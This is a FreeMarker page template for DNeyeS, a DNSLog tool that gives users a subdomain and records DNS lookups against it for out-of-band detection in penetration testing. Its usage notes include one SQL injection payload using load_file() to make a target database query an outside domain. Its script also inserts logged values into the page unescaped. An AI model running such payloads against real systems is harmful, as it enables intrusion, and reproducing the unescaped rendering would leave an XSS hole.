<#include "../layout/layout.ftl"/>
<#include "../layout/comments.ftl"/>
<#include "kitboxmenu.ftl"/>
<@compress single_line=true>
    <!DOCTYPE html>
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN" dir="ltr" prefix="og: http://ogp.me/ns#">
    <@head pageView>
    </@head>
    <body>
    <@header pageView>

    </@header>
    <div class="container" style="padding-top: 50px;">
        <div class="row">
            <div class="col-sm-3 col-md-3">
                <@KitBoxMenu KitBoxMenus active></@KitBoxMenu>
            </div>
            <div class="col-sm-9 col-md-9">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">DNeyeS工具</h5>
                        <h6 class="card-subtitle mb-2 text-muted">
                            DNeyeS（DNSLog）工具，记录DNS解析请求记录信息，可用于渗透测试、SQL注入、XSS盲打等探测。</h6>
                        <div>
                            <div style="text-align: center;">
                                <img src="https://cdn.renfei.net/thunder/img/dneyess.png" alt="DNeyeS.net"
                                     style="max-width: 400px;width: 100%;height: auto;">
                            </div>
                            <form>
                                <label class="sr-only" for="iptext">IP</label>
                                <div class="input-group mb-2 mr-sm-2">
                                    <div class="input-group-prepend">
                                        <div class="btn btn-primary" onclick="getSubDomain()">Get Domain</div>
                                    </div>
                                    <input type="text" class="form-control" value=""
                                           id="subdomain" placeholder="点击左侧 Get Domain 生成一个子域名">
                                    <div class="input-group-prepend">
                                        <div class="btn btn-primary" onclick="query()">Query</div>
                                    </div>
                                </div>
                            </form>
                            <table class="table table-sm" style="margin-bottom: 5rem;">
                                <thead>
                                <tr>
                                    <th scope="col">DNS Query Record</th>
                                    <th scope="col">IP Address</th>
                                    <th scope="col">Created Time</th>
                                    <th scope="col">Host Name</th>
                                </tr>
                                </thead>
                                <tbody id="tablebody">
                                </tbody>
                            </table>
                            <div class="row mt-3">
                                <div class="col-md-12" style="font-size: 14px;">
                                    <h5>关于 DNeyeS</h5>
                                    <p style="text-indent: 2em;">
                                        DNeyeS 可以为您生成一个您的专属子域名，并且可以监控该子域名解析的记录详情，包括解析的客户端IP、主机名、时间。
                                    </p>
                                    <h5>使用说明</h5>
                                    <ul>
                                        <li>如果您还没有生成过子域名，请先点击左侧的 Get Domain 按钮，生成一个属于您的子域名</li>
                                        <li>如果您已经有一个属于您的子域名，可以直接填入</li>
                                        <li>点击右侧的 Query 按钮可查询该子域名的解析记录</li>
                                        <li>如果您登陆了您的账号，那么生成的子域名将只允许您自己查询，否则可以公开查询</li>
                                        <li>获得子域名以后，您可以使用更多级的子域名，例如您获取到了 abc.dneyes.net，您也可以使用
                                            def.abc.dneyes.net/ght.def.abc.dneyes.net 等多级子域名，它们的解析也会被记录。
                                        </li>
                                    </ul>
                                    <h5>使用案例</h5>
                                    <ul>
                                        <li>渗透测试：在很多生产环境中有严格的进出站规则，这可能造成出站方向 HTTP 协议不通，但 DNS 解析可能是通的，只要域名被解析，就证明渗透成功。
                                        </li>
                                        <li>XSS盲注：大批量盲注时，怎么知道注入成功了？还得写个接口来接数据吗？不如直接用 DNeyeS 有解析记录，就说明成功了。</li>
                                        <li>SQL注入：使用load_file()发送dns请求： select
                                            load_file("\\\\ccc.xxxx.dneyes.net\\aaa");
                                        </li>
                                        <li>更多玩法，请自行打开脑洞。</li>
                                    </ul>
                                </div>
                            </div>
                            <div class="d-none d-sm-block">
                                <@adsense "9903187829" active></@adsense>
                            </div>
                        </div>
                    </div>
                </div>
                <@comments commentList account!"null" "KITBOX" kitBoxId></@comments>
            </div>
        </div>
    </div>
    <@footer pageView>
        <script>
            function getSubDomain() {
                $.ajax({
                    url: '/-/api/kitbox/dneyes/subdomain',
                    type: 'POST',
                    async: true,
                    timeout: 10000,
                    dataType: 'json',
                    success: function (data, textStatus, jqXHR) {
                        if (data.code === 200) {
                            $("#subdomain").val(data.data);
                        } else {
                            msg(data.message, "error");
                        }
                    },
                    beforeSend: function (xhr) {
                        let csrfHeader = $("meta[name='_csrf_header']").attr("content");
                        let csrf = $("meta[name='_csrf']").attr("content");
                        if (csrfHeader !== '') {
                            xhr.setRequestHeader(csrfHeader, csrf);
                        }
                    },
                    error: function (xhr, textStatus) {
                        msg(xhr.responseText, "error");
                    }
                });
            }

            function query() {
                $("#tablebody").html("");
                var subdomain = $("#subdomain").val();
                if (subdomain === '') {
                    msg("请填写要查询的SubDomain", "error");
                    return;
                }
                $.ajax({
                    url: '/-/api/kitbox/dneyes/' + subdomain,
                    type: 'POST',
                    async: true,
                    timeout: 10000,
                    dataType: 'json',
                    success: function (data, textStatus, jqXHR) {
                        if (data.code === 200) {
                            let html = "";
                            for (let i = 0; i < data.data.length; i++) {
                                html += "<tr>"
                                    + "<th scope=\"row\">"
                                    + data.data[i].subDomain
                                    + "</th><td>"
                                    + data.data[i].clientIp
                                    + "</td><td>"
                                    + data.data[i].logTime
                                    + "</td><td>"
                                    + data.data[i].clientHostName
                                    + "</td></tr>";
                            }
                            $("#tablebody").html(html);
                        } else {
                            msg(data.message, "error");
                        }
                    },
                    beforeSend: function (xhr) {
                        let csrfHeader = $("meta[name='_csrf_header']").attr("content");
                        let csrf = $("meta[name='_csrf']").attr("content");
                        if (csrfHeader !== '') {
                            xhr.setRequestHeader(csrfHeader, csrf);
                        }
                    },
                    error: function (xhr, textStatus) {
                        msg(xhr.responseText, "error");
                    }
                });
            }
        </script>
    </@footer>
    </body>
    </html>
</@compress>